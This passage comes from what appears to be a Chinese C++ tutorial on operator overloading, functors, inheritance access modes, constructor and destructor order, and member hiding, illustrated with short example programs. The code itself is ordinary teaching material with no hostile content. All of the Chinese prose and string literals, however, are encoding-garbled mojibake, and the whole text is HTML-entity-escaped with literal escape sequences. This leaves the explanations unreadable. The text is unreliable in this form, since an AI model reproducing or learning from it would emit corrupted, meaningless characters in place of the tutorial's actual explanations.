&#x2F;&#x2F;èµ‹å€¼æ“ä½œ\n\n\tcout &lt;&lt; &quot;p1çš„å¹´é¾„ä¸ºï¼š&quot; &lt;&lt; *p1.m_Age &lt;&lt; endl;\n\n\tcout &lt;&lt; &quot;p2çš„å¹´é¾„ä¸ºï¼š&quot; &lt;&lt; *p2.m_Age &lt;&lt; endl;\n\n\tcout &lt;&lt; &quot;p3çš„å¹´é¾„ä¸ºï¼š&quot; &lt;&lt; *p3.m_Age &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\t&#x2F;&#x2F;int a &#x3D; 10;\n\t&#x2F;&#x2F;int b &#x3D; 20;\n\t&#x2F;&#x2F;int c &#x3D; 30;\n\n\t&#x2F;&#x2F;c &#x3D; b &#x3D; a;\n\t&#x2F;&#x2F;cout &lt;&lt; &quot;a &#x3D; &quot; &lt;&lt; a &lt;&lt; endl;\n\t&#x2F;&#x2F;cout &lt;&lt; &quot;b &#x3D; &quot; &lt;&lt; b &lt;&lt; endl;\n\t&#x2F;&#x2F;cout &lt;&lt; &quot;c &#x3D; &quot; &lt;&lt; c &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nå…³ç³»è¿ç®—ç¬¦é‡è½½ä½œç”¨ï¼šé‡è½½å…³ç³»è¿ç®—ç¬¦ï¼Œå¯ä»¥è®©ä¸¤ä¸ªè‡ªå®šä¹‰ç±»å‹å¯¹è±¡è¿›è¡Œå¯¹æ¯”æ“ä½œ\nç¤ºä¾‹ï¼š\nclass Person\n&#123;\npublic:\n\tPerson(string name, int age)\n\t&#123;\n\t\tthis-&gt;m_Name &#x3D; name;\n\t\tthis-&gt;m_Age &#x3D; age;\n\t&#125;;\n\n\tbool operator&#x3D;&#x3D;(Person &amp; p)\n\t&#123;\n\t\tif (this-&gt;m_Name &#x3D;&#x3D; p.m_Name &amp;&amp; this-&gt;m_Age &#x3D;&#x3D; p.m_Age)\n\t\t&#123;\n\t\t\treturn true;\n\t\t&#125;\n\t\telse\n\t\t&#123;\n\t\t\treturn false;\n\t\t&#125;\n\t&#125;\n\n\tbool operator!&#x3D;(Person &amp; p)\n\t&#123;\n\t\tif (this-&gt;m_Name &#x3D;&#x3D; p.m_Name &amp;&amp; this-&gt;m_Age &#x3D;&#x3D; p.m_Age)\n\t\t&#123;\n\t\t\treturn false;\n\t\t&#125;\n\t\telse\n\t\t&#123;\n\t\t\treturn true;\n\t\t&#125;\n\t&#125;\n\n\tstring m_Name;\n\tint m_Age;\n&#125;;\n\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;int a &#x3D; 0;\n\t&#x2F;&#x2F;int b &#x3D; 0;\n\n\tPerson a(&quot;å­™æ‚Ÿç©º&quot;, 18);\n\tPerson b(&quot;å­™æ‚Ÿç©º&quot;, 18);\n\n\tif (a &#x3D;&#x3D; b)\n\t&#123;\n\t\tcout &lt;&lt; &quot;aå’Œbç›¸ç­‰&quot; &lt;&lt; endl;\n\t&#125;\n\telse\n\t&#123;\n\t\tcout &lt;&lt; &quot;aå’Œbä¸ç›¸ç­‰&quot; &lt;&lt; endl;\n\t&#125;\n\n\tif (a !&#x3D; b)\n\t&#123;\n\t\tcout &lt;&lt; &quot;aå’Œbä¸ç›¸ç­‰&quot; &lt;&lt; endl;\n\t&#125;\n\telse\n\t&#123;\n\t\tcout &lt;&lt; &quot;aå’Œbç›¸ç­‰&quot; &lt;&lt; endl;\n\t&#125;\n&#125;\n\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nå‡½æ•°è°ƒç”¨è¿ç®—ç¬¦é‡è½½\nå‡½æ•°è°ƒç”¨è¿ç®—ç¬¦ () ä¹Ÿå¯ä»¥é‡è½½\nç”±äºé‡è½½åä½¿ç”¨çš„æ–¹å¼éå¸¸åƒå‡½æ•°çš„è°ƒç”¨ï¼Œå› æ­¤ç§°ä¸ºä»¿å‡½æ•°\nä»¿å‡½æ•°æ²¡æœ‰å›ºå®šå†™æ³•ï¼Œéå¸¸çµæ´»\n\nç¤ºä¾‹ï¼š\nclass MyPrint\n&#123;\npublic:\n\tvoid operator()(string text)\n\t&#123;\n\t\tcout &lt;&lt; text &lt;&lt; endl;\n\t&#125;\n\n&#125;;\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;é‡è½½çš„ï¼ˆï¼‰æ“ä½œç¬¦ ä¹Ÿç§°ä¸ºä»¿å‡½æ•°\n\tMyPrint myFunc;\n\tmyFunc(&quot;hello world&quot;);\n&#125;\n\n\nclass MyAdd\n&#123;\npublic:\n\tint operator()(int v1, int v2)\n\t&#123;\n\t\treturn v1 + v2;\n\t&#125;\n&#125;;\n\nvoid test02()\n&#123;\n\tMyAdd add;\n\tint ret &#x3D; add(10, 10);\n\tcout &lt;&lt; &quot;ret &#x3D; &quot; &lt;&lt; ret &lt;&lt; endl;\n\n\t&#x2F;&#x2F;åŒ¿åå¯¹è±¡è°ƒç”¨  \n\tcout &lt;&lt; &quot;MyAdd()(100,100) &#x3D; &quot; &lt;&lt; MyAdd()(100, 100) &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\ttest02();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nç»§æ‰¿ç»§æ‰¿æ˜¯é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§ä¹‹ä¸€\næœ‰äº›ç±»ä¸ç±»ä¹‹é—´å­˜åœ¨ç‰¹æ®Šçš„å…³ç³»\næˆ‘ä»¬å‘ç°ï¼Œå®šä¹‰è¿™äº›ç±»æ—¶ï¼Œä¸‹çº§åˆ«çš„æˆå‘˜é™¤äº†æ‹¥æœ‰ä¸Šä¸€çº§çš„å…±æ€§ï¼Œè¿˜æœ‰è‡ªå·±çš„ç‰¹æ€§ã€‚\nè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘åˆ©ç”¨ç»§æ‰¿çš„æŠ€æœ¯ï¼Œå‡å°‘é‡å¤ä»£ç \nç»§æ‰¿çš„åŸºæœ¬è¯­æ³•ä¾‹å¦‚æˆ‘ä»¬çœ‹åˆ°å¾ˆå¤šç½‘ç«™ä¸­ï¼Œéƒ½æœ‰å…¬å…±çš„å¤´éƒ¨ï¼Œå…¬å…±çš„åº•éƒ¨ï¼Œç”šè‡³å…¬å…±çš„å·¦ä¾§åˆ—è¡¨ï¼Œåªæœ‰ä¸­å¿ƒå†…å®¹ä¸åŒ\næ¥ä¸‹æ¥æˆ‘ä»¬åˆ†åˆ«åˆ©ç”¨æ™®é€šå†™æ³•å’Œç»§æ‰¿çš„å†™æ³•æ¥å®ç°ç½‘é¡µä¸­çš„å†…å®¹ï¼Œçœ‹ä¸€ä¸‹ç»§æ‰¿å­˜åœ¨çš„æ„ä¹‰ä»¥åŠå¥½å¤„\næ™®é€šå®ç°ï¼š\n&#x2F;&#x2F;Javaé¡µé¢\nclass Java \n&#123;\npublic:\n\tvoid header()\n\t&#123;\n\t\tcout &lt;&lt; &quot;é¦–é¡µã€å…¬å¼€è¯¾ã€ç™»å½•ã€æ³¨å†Œ...ï¼ˆå…¬å…±å¤´éƒ¨ï¼‰&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid footer()\n\t&#123;\n\t\tcout &lt;&lt; &quot;å¸®åŠ©ä¸­å¿ƒã€äº¤æµåˆä½œã€ç«™å†…åœ°å›¾...(å…¬å…±åº•éƒ¨)&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid left()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Java,Python,C++...(å…¬å…±åˆ†ç±»åˆ—è¡¨)&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid content()\n\t&#123;\n\t\tcout &lt;&lt; &quot;JAVAå­¦ç§‘è§†é¢‘&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n&#x2F;&#x2F;Pythoné¡µé¢\nclass Python\n&#123;\npublic:\n\tvoid header()\n\t&#123;\n\t\tcout &lt;&lt; &quot;é¦–é¡µã€å…¬å¼€è¯¾ã€ç™»å½•ã€æ³¨å†Œ...ï¼ˆå…¬å…±å¤´éƒ¨ï¼‰&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid footer()\n\t&#123;\n\t\tcout &lt;&lt; &quot;å¸®åŠ©ä¸­å¿ƒã€äº¤æµåˆä½œã€ç«™å†…åœ°å›¾...(å…¬å…±åº•éƒ¨)&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid left()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Java,Python,C++...(å…¬å…±åˆ†ç±»åˆ—è¡¨)&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid content()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Pythonå­¦ç§‘è§†é¢‘&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n&#x2F;&#x2F;C++é¡µé¢\nclass CPP \n&#123;\npublic:\n\tvoid header()\n\t&#123;\n\t\tcout &lt;&lt; &quot;é¦–é¡µã€å…¬å¼€è¯¾ã€ç™»å½•ã€æ³¨å†Œ...ï¼ˆå…¬å…±å¤´éƒ¨ï¼‰&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid footer()\n\t&#123;\n\t\tcout &lt;&lt; &quot;å¸®åŠ©ä¸­å¿ƒã€äº¤æµåˆä½œã€ç«™å†…åœ°å›¾...(å…¬å…±åº•éƒ¨)&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid left()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Java,Python,C++...(å…¬å…±åˆ†ç±»åˆ—è¡¨)&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid content()\n\t&#123;\n\t\tcout &lt;&lt; &quot;C++å­¦ç§‘è§†é¢‘&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;Javaé¡µé¢\n\tcout &lt;&lt; &quot;Javaä¸‹è½½è§†é¢‘é¡µé¢å¦‚ä¸‹ï¼š &quot; &lt;&lt; endl;\n\tJava ja;\n\tja.header();\n\tja.footer();\n\tja.left();\n\tja.content();\n\tcout &lt;&lt; &quot;--------------------&quot; &lt;&lt; endl;\n\n\t&#x2F;&#x2F;Pythoné¡µé¢\n\tcout &lt;&lt; &quot;Pythonä¸‹è½½è§†é¢‘é¡µé¢å¦‚ä¸‹ï¼š &quot; &lt;&lt; endl;\n\tPython py;\n\tpy.header();\n\tpy.footer();\n\tpy.left();\n\tpy.content();\n\tcout &lt;&lt; &quot;--------------------&quot; &lt;&lt; endl;\n\n\t&#x2F;&#x2F;C++é¡µé¢\n\tcout &lt;&lt; &quot;C++ä¸‹è½½è§†é¢‘é¡µé¢å¦‚ä¸‹ï¼š &quot; &lt;&lt; endl;\n\tCPP cp;\n\tcp.header();\n\tcp.footer();\n\tcp.left();\n\tcp.content();\n\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nç»§æ‰¿å®ç°ï¼š\n&#x2F;&#x2F;å…¬å…±é¡µé¢\nclass BasePage\n&#123;\npublic:\n\tvoid header()\n\t&#123;\n\t\tcout &lt;&lt; &quot;é¦–é¡µã€å…¬å¼€è¯¾ã€ç™»å½•ã€æ³¨å†Œ...ï¼ˆå…¬å…±å¤´éƒ¨ï¼‰&quot; &lt;&lt; endl;\n\t&#125;\n\n\tvoid footer()\n\t&#123;\n\t\tcout &lt;&lt; &quot;å¸®åŠ©ä¸­å¿ƒã€äº¤æµåˆä½œã€ç«™å†…åœ°å›¾...(å…¬å…±åº•éƒ¨)&quot; &lt;&lt; endl;\n\t&#125;\n\tvoid left()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Java,Python,C++...(å…¬å…±åˆ†ç±»åˆ—è¡¨)&quot; &lt;&lt; endl;\n\t&#125;\n\n&#125;;\n\n&#x2F;&#x2F;Javaé¡µé¢\nclass Java : public BasePage\n&#123;\npublic:\n\tvoid content()\n\t&#123;\n\t\tcout &lt;&lt; &quot;JAVAå­¦ç§‘è§†é¢‘&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n&#x2F;&#x2F;Pythoné¡µé¢\nclass Python : public BasePage\n&#123;\npublic:\n\tvoid content()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Pythonå­¦ç§‘è§†é¢‘&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n&#x2F;&#x2F;C++é¡µé¢\nclass CPP : public BasePage\n&#123;\npublic:\n\tvoid content()\n\t&#123;\n\t\tcout &lt;&lt; &quot;C++å­¦ç§‘è§†é¢‘&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;Javaé¡µé¢\n\tcout &lt;&lt; &quot;Javaä¸‹è½½è§†é¢‘é¡µé¢å¦‚ä¸‹ï¼š &quot; &lt;&lt; endl;\n\tJava ja;\n\tja.header();\n\tja.footer();\n\tja.left();\n\tja.content();\n\tcout &lt;&lt; &quot;--------------------&quot; &lt;&lt; endl;\n\n\t&#x2F;&#x2F;Pythoné¡µé¢\n\tcout &lt;&lt; &quot;Pythonä¸‹è½½è§†é¢‘é¡µé¢å¦‚ä¸‹ï¼š &quot; &lt;&lt; endl;\n\tPython py;\n\tpy.header();\n\tpy.footer();\n\tpy.left();\n\tpy.content();\n\tcout &lt;&lt; &quot;--------------------&quot; &lt;&lt; endl;\n\n\t&#x2F;&#x2F;C++é¡µé¢\n\tcout &lt;&lt; &quot;C++ä¸‹è½½è§†é¢‘é¡µé¢å¦‚ä¸‹ï¼š &quot; &lt;&lt; endl;\n\tCPP cp;\n\tcp.header();\n\tcp.footer();\n\tcp.left();\n\tcp.content();\n\n\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\næ€»ç»“ï¼š\nç»§æ‰¿çš„å¥½å¤„ï¼š&#x3D;&#x3D;å¯ä»¥å‡å°‘é‡å¤çš„ä»£ç &#x3D;&#x3D;\nclass A : public B;\nA ç±»ç§°ä¸ºå­ç±» æˆ– æ´¾ç”Ÿç±»\nB ç±»ç§°ä¸ºçˆ¶ç±» æˆ– åŸºç±»\næ´¾ç”Ÿç±»ä¸­çš„æˆå‘˜ï¼ŒåŒ…å«ä¸¤å¤§éƒ¨åˆ†ï¼š\nä¸€ç±»æ˜¯ä»åŸºç±»ç»§æ‰¿è¿‡æ¥çš„ï¼Œä¸€ç±»æ˜¯è‡ªå·±å¢åŠ çš„æˆå‘˜ã€‚\nä»åŸºç±»ç»§æ‰¿è¿‡è¿‡æ¥çš„è¡¨ç°å…¶å…±æ€§ï¼Œè€Œæ–°å¢çš„æˆå‘˜ä½“ç°äº†å…¶ä¸ªæ€§ã€‚\nç»§æ‰¿æ–¹å¼ç»§æ‰¿çš„è¯­æ³•ï¼šclass å­ç±» : ç»§æ‰¿æ–¹å¼ çˆ¶ç±»\nç»§æ‰¿æ–¹å¼ä¸€å…±æœ‰ä¸‰ç§ï¼š\n\nå…¬å…±ç»§æ‰¿\nä¿æŠ¤ç»§æ‰¿\nç§æœ‰ç»§æ‰¿\n\nç¤ºä¾‹ï¼š\nclass Base1\n&#123;\npublic: \n\tint m_A;\nprotected:\n\tint m_B;\nprivate:\n\tint m_C;\n&#125;;\n\n&#x2F;&#x2F;å…¬å…±ç»§æ‰¿\nclass Son1 :public Base1\n&#123;\npublic:\n\tvoid func()\n\t&#123;\n\t\tm_A; &#x2F;&#x2F;å¯è®¿é—® publicæƒé™\n\t\tm_B; &#x2F;&#x2F;å¯è®¿é—® protectedæƒé™\n\t\t&#x2F;&#x2F;m_C; &#x2F;&#x2F;ä¸å¯è®¿é—®\n\t&#125;\n&#125;;\n\nvoid myClass()\n&#123;\n\tSon1 s1;\n\ts1.m_A; &#x2F;&#x2F;å…¶ä»–ç±»åªèƒ½è®¿é—®åˆ°å…¬å…±æƒé™\n&#125;\n\n&#x2F;&#x2F;ä¿æŠ¤ç»§æ‰¿\nclass Base2\n&#123;\npublic:\n\tint m_A;\nprotected:\n\tint m_B;\nprivate:\n\tint m_C;\n&#125;;\nclass Son2:protected Base2\n&#123;\npublic:\n\tvoid func()\n\t&#123;\n\t\tm_A; &#x2F;&#x2F;å¯è®¿é—® protectedæƒé™\n\t\tm_B; &#x2F;&#x2F;å¯è®¿é—® protectedæƒé™\n\t\t&#x2F;&#x2F;m_C; &#x2F;&#x2F;ä¸å¯è®¿é—®\n\t&#125;\n&#125;;\nvoid myClass2()\n&#123;\n\tSon2 s;\n\t&#x2F;&#x2F;s.m_A; &#x2F;&#x2F;ä¸å¯è®¿é—®\n&#125;\n\n&#x2F;&#x2F;ç§æœ‰ç»§æ‰¿\nclass Base3\n&#123;\npublic:\n\tint m_A;\nprotected:\n\tint m_B;\nprivate:\n\tint m_C;\n&#125;;\nclass Son3:private Base3\n&#123;\npublic:\n\tvoid func()\n\t&#123;\n\t\tm_A; &#x2F;&#x2F;å¯è®¿é—® privateæƒé™\n\t\tm_B; &#x2F;&#x2F;å¯è®¿é—® privateæƒé™\n\t\t&#x2F;&#x2F;m_C; &#x2F;&#x2F;ä¸å¯è®¿é—®\n\t&#125;\n&#125;;\nclass GrandSon3 :public Son3\n&#123;\npublic:\n\tvoid func()\n\t&#123;\n\t\t&#x2F;&#x2F;Son3æ˜¯ç§æœ‰ç»§æ‰¿ï¼Œæ‰€ä»¥ç»§æ‰¿Son3çš„å±æ€§åœ¨GrandSon3ä¸­éƒ½æ— æ³•è®¿é—®åˆ°\n\t\t&#x2F;&#x2F;m_A;\n\t\t&#x2F;&#x2F;m_B;\n\t\t&#x2F;&#x2F;m_C;\n\t&#125;\n&#125;;\n\nç»§æ‰¿ä¸­çš„å¯¹è±¡æ¨¡å‹é—®é¢˜ï¼šä»çˆ¶ç±»ç»§æ‰¿è¿‡æ¥çš„æˆå‘˜ï¼Œå“ªäº›å±äºå­ç±»å¯¹è±¡ä¸­ï¼Ÿ\nç¤ºä¾‹ï¼š\nclass Base\n&#123;\npublic:\n\tint m_A;\nprotected:\n\tint m_B;\nprivate:\n\tint m_C; &#x2F;&#x2F;ç§æœ‰æˆå‘˜åªæ˜¯è¢«éšè—äº†ï¼Œä½†æ˜¯è¿˜æ˜¯ä¼šç»§æ‰¿ä¸‹å»\n&#125;;\n\n&#x2F;&#x2F;å…¬å…±ç»§æ‰¿\nclass Son :public Base\n&#123;\npublic:\n\tint m_D;\n&#125;;\n\nvoid test01()\n&#123;\n\tcout &lt;&lt; &quot;sizeof Son &#x3D; &quot; &lt;&lt; sizeof(Son) &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nåˆ©ç”¨å·¥å…·æŸ¥çœ‹ï¼š\nVisual Studioä¸‹æœ‰åç§°ä¸ºâ€œå¼€å‘äººå‘˜çš„å‘½ä»¤æç¤ºç¬¦â€\næ‰“å¼€å·¥å…·çª—å£åï¼Œå®šä½åˆ°å½“å‰CPPæ–‡ä»¶çš„ç›˜ç¬¦\nç„¶åè¾“å…¥ï¼š cl &#x2F;d1 reportSingleClassLayoutSonæŸ¥çœ‹çš„ç±»å æ‰€å±æ–‡ä»¶å\n*************************************************************\nC:\\Program Files (x86)\\Microsoft Visual Studio\\Community&gt;F:\nF:\\&gt;cd F:\\VSé¡¹ç›®\\ç»§æ‰¿\\\nF:\\&gt;cd F:\\VSé¡¹ç›®\\ç»§æ‰¿\\cl &#x2F;d1 reportSingleClassLayoutSon &quot;ç»§æ‰¿ä¸­çš„å¯¹è±¡æ¨¡å‹.cpp&quot;\n\n\n\n\n\n\n\n\n\n\nç»“è®ºï¼š çˆ¶ç±»ä¸­ç§æœ‰æˆå‘˜ä¹Ÿæ˜¯è¢«å­ç±»ç»§æ‰¿ä¸‹å»äº†ï¼Œåªæ˜¯ç”±ç¼–è¯‘å™¨ç»™éšè—åè®¿é—®ä¸åˆ°\nç»§æ‰¿ä¸­æ„é€ å’Œææ„é¡ºåºå­ç±»ç»§æ‰¿çˆ¶ç±»åï¼Œå½“åˆ›å»ºå­ç±»å¯¹è±¡ï¼Œä¹Ÿä¼šè°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•°\né—®é¢˜ï¼šçˆ¶ç±»å’Œå­ç±»çš„æ„é€ å’Œææ„é¡ºåºæ˜¯è°å…ˆè°åï¼Ÿ\nç¤ºä¾‹ï¼š\nclass Base \n&#123;\npublic:\n\tBase()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Baseæ„é€ å‡½æ•°!&quot; &lt;&lt; endl;\n\t&#125;\n\t~Base()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Baseææ„å‡½æ•°!&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\nclass Son : public Base\n&#123;\npublic:\n\tSon()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Sonæ„é€ å‡½æ•°!&quot; &lt;&lt; endl;\n\t&#125;\n\t~Son()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Sonææ„å‡½æ•°!&quot; &lt;&lt; endl;\n\t&#125;\n\n&#125;;\n\n\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;ç»§æ‰¿ä¸­ å…ˆè°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼Œå†è°ƒç”¨å­ç±»æ„é€ å‡½æ•°ï¼Œææ„é¡ºåºä¸æ„é€ ç›¸å\n\tSon s;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\n\n\n\n\n\n\n\n\næ€»ç»“ï¼šç»§æ‰¿ä¸­ å…ˆè°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼Œå†è°ƒç”¨å­ç±»æ„é€ å‡½æ•°ï¼Œææ„é¡ºåºä¸æ„é€ ç›¸å\nç»§æ‰¿åŒåæˆå‘˜å¤„ç†æ–¹å¼é—®é¢˜ï¼šå½“å­ç±»ä¸çˆ¶ç±»å‡ºç°åŒåçš„æˆå‘˜ï¼Œå¦‚ä½•é€šè¿‡å­ç±»å¯¹è±¡ï¼Œè®¿é—®åˆ°å­ç±»æˆ–çˆ¶ç±»ä¸­åŒåçš„æ•°æ®å‘¢ï¼Ÿ\n\nè®¿é—®å­ç±»åŒåæˆå‘˜ ç›´æ¥è®¿é—®å³å¯\nè®¿é—®çˆ¶ç±»åŒåæˆå‘˜ éœ€è¦åŠ ä½œç”¨åŸŸ\n\nç¤ºä¾‹ï¼š\nclass Base &#123;\npublic:\n\tBase()\n\t&#123;\n\t\tm_A &#x3D; 100;\n\t&#125;\n\n\tvoid func()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Base - func()è°ƒç”¨&quot; &lt;&lt; endl;\n\t&#125;\n\n\tvoid func(int a)\n\t&#123;\n\t\tcout &lt;&lt; &quot;Base - func(int a)è°ƒç”¨&quot; &lt;&lt; endl;\n\t&#125;\n\npublic:\n\tint m_A;\n&#125;;\n\n\nclass Son : public Base &#123;\npublic:\n\tSon()\n\t&#123;\n\t\tm_A &#x3D; 200;\n\t&#125;\n\n\t&#x2F;&#x2F;å½“å­ç±»ä¸çˆ¶ç±»æ‹¥æœ‰åŒåçš„æˆå‘˜å‡½æ•°ï¼Œå­ç±»ä¼šéšè—çˆ¶ç±»ä¸­æ‰€æœ‰ç‰ˆæœ¬çš„åŒåæˆå‘˜å‡½æ•°\n\t&#x2F;&#x2F;å¦‚æœæƒ³è®¿é—®çˆ¶ç±»ä¸­è¢«éšè—çš„åŒåæˆå‘˜å‡½æ•°ï¼Œéœ€è¦åŠ çˆ¶ç±»çš„ä½œç”¨åŸŸ\n\tvoid func()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Son - func()è°ƒç”¨&quot; &lt;&lt; endl;\n\t&#125;\npublic:\n\tint m_A;\n&#125;;\n\nvoid test01()\n&#123;\n\tSon s;\n\n\tcout &lt;&lt; &quot;Sonä¸‹çš„m_A &#x3D; &quot; &lt;&lt; s.m_A &lt;&lt; endl;\n\tcout &lt;&lt; &quot;Baseä¸‹çš„m_A &#x3D; &quot; &lt;&lt; s.Base::m_A &lt;&lt; endl;\n\n\ts.func();\n\ts.Base::func();\n\ts.Base::func(10);\n\n&#125;\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\treturn EXIT_SUCCESS;\n&#125;\n\næ€»ç»“ï¼š\n\nå­ç±»å¯¹è±¡å¯ä»¥ç›´æ¥è®¿é—®åˆ°å­ç±»ä¸­åŒåæˆå‘˜\nå­ç±»å¯¹è±¡åŠ ä½œç”¨åŸŸå¯ä»¥è®¿é—®åˆ°çˆ¶ç±»åŒåæˆå‘˜\nå½“å­ç±»ä¸çˆ¶ç±»æ‹¥æœ‰åŒåçš„æˆå‘˜å‡½æ•°ï¼Œå­ç±»ä¼šéšè—çˆ¶ç±»ä¸­åŒåæˆå‘˜å‡½æ•°ï¼ŒåŠ ä½œç”¨åŸŸå¯ä»¥è®¿é—®åˆ°çˆ¶ç±»ä¸­åŒåå‡½æ•°\n\nç»§æ‰¿åŒåé™æ€æˆå‘˜å¤„ç†æ–¹å¼é—®é¢˜ï¼šç»§æ‰¿ä¸­åŒåçš„é™æ€æˆå‘˜åœ¨å­ç±»å¯¹è±¡ä¸Šå¦‚ä½•è¿›è¡Œè®¿é—®ï¼Ÿ\né™æ€æˆå‘˜å’Œéé™æ€æˆå‘˜å‡ºç°åŒåï¼Œå¤„ç†æ–¹å¼ä¸€è‡´\n\nè®¿é—®å­ç±»åŒåæˆå‘˜ ç›´æ¥è®¿é—®å³å¯\nè®¿é—®çˆ¶ç±»åŒåæˆå‘˜ éœ€è¦åŠ ä½œç”¨åŸŸ\n\nç¤ºä¾‹ï¼š\nclass Base &#123;\npublic:\n\tstatic void func()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Base - static void func()&quot; &lt;&lt; endl;\n\t&#125;\n\tstatic void func(int a)\n\t&#123;\n\t\tcout &lt;&lt; &quot;Base - static void func(int a)&quot; &lt;&lt; endl;\n\t&#125;\n\n\tstatic int m_A;\n&#125;;\n\nint Base::m_A &#x3D; 100;\n\nclass Son : public Base &#123;\npublic:\n\tstatic void func()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Son - static void func()&quot; &lt;&lt; endl;\n\t&#125;\n\tstatic int m_A;\n&#125;;\n\nint Son::m_A &#x3D; 200;\n\n&#x2F;&#x2F;åŒåæˆå‘˜å±æ€§\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;é€šè¿‡å¯¹è±¡è®¿é—®\n\tcout &lt;&lt; &quot;é€šè¿‡å¯¹è±¡è®¿é—®ï¼š &quot; &lt;&lt; endl;\n\tSon s;\n\tcout &lt;&lt; &quot;Son  ä¸‹ m_A &#x3D; &quot; &lt;&lt; s.m_A &lt;&lt; endl;\n\tcout &lt;&lt; &quot;Base ä¸‹ m_A &#x3D; &quot; &lt;&lt; s.Base::m_A &lt;&lt; endl;\n\n\t&#x2F;&#x2F;é€šè¿‡ç±»åè®¿é—®\n\tcout &lt;&lt; &quot;é€šè¿‡ç±»åè®¿é—®ï¼š &quot; &lt;&lt; endl;\n\tcout &lt;&lt; &quot;Son  ä¸‹ m_A &#x3D; &quot; &lt;&lt; Son::m_A &lt;&lt; endl;\n\tcout &lt;&lt; &quot;Base ä¸‹ m_A &#x3D; &quot; &lt;&lt; Son::Base::m_A &lt;&lt; endl;\n&#125;\n\n&#x2F;&#x2F;åŒåæˆå‘˜å‡½æ•°\nvoid test02()\n&#123;\n\t&#x2F;&#x2F;é€šè¿‡å¯¹è±¡è®¿é—®\n\tcout &lt;&lt; &quot;é€šè¿‡å¯¹è±¡è®¿é—®ï¼š &quot; &lt;&lt; endl;\n\tSon s;\n\ts.func();\n\ts.Base::func();\n\n\tcout &lt;&lt; &quot;é€šè¿‡ç±»åè®¿é—®ï¼š &quot; &lt;&lt; endl;\n\tSon::func();\n\tSon::Base::func();\n\t&#x2F;&#x2F;å‡ºç°åŒåï¼Œå­ç±»ä¼šéšè—æ‰çˆ¶ç±»ä¸­æ‰€æœ‰åŒåæˆå‘˜å‡½æ•°ï¼Œéœ€è¦åŠ ä½œä½œç”¨åŸŸè®¿é—®\n\tSon::Base::func(100);\n&#125;\nint main() &#123;\n\n\t&#x2F;&#x2F;test01();\n\ttest02();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\n\n\n\n\n\n\n\n\næ€»ç»“ï¼šåŒåé™æ€æˆå‘˜å¤„ç†æ–¹å¼å’Œéé™æ€å¤„ç†æ–¹å¼ä¸€æ ·ï¼Œåªä¸è¿‡æœ‰ä¸¤ç§è®¿é—®çš„æ–¹å¼ï¼ˆé€šè¿‡å¯¹è±¡ å’Œ é€šè¿‡ç±»åï¼‰\nå¤šç»§æ‰¿è¯­æ³•C++å…è®¸ä¸€ä¸ªç±»ç»§æ‰¿å¤šä¸ªç±»\nè¯­æ³•ï¼š class å­ç±» ï¼šç»§æ‰¿æ–¹å¼ çˆ¶ç±»1 ï¼Œ ç»§æ‰¿æ–¹å¼ çˆ¶ç±»2...\nå¤šç»§æ‰¿å¯èƒ½ä¼šå¼•å‘çˆ¶ç±»ä¸­æœ‰åŒåæˆå‘˜å‡ºç°ï¼Œéœ€è¦åŠ ä½œç”¨åŸŸåŒºåˆ†\nC++å®é™…å¼€å‘ä¸­ä¸å»ºè®®ç”¨å¤šç»§æ‰¿\nç¤ºä¾‹ï¼š\nclass 